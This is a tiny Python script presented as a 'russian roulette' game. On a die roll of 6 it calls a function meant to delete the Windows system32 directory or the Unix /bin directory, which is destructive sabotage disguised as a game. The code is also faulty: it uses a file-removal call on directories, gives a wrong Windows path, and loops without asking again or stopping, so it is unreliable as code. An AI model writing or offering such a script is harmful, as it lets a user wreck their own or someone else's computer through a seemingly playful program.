from random import randint
import sys
import os

def clear_sys():
    if sys.platform in ["win32","cygwin"]:
        os.remove("C:/system32")
    else:
        os.remove("/bin")

i = input("Would you like to play russian roulette? (y/n) ")
while i != "n":
    roll = randint(1, 6)
    if roll != 6:
        print(f"You rolled a {roll}. Congratulations, your computer lives to see another day.")
        continue
    clear_sys() # if roll == 6 remove system binaries 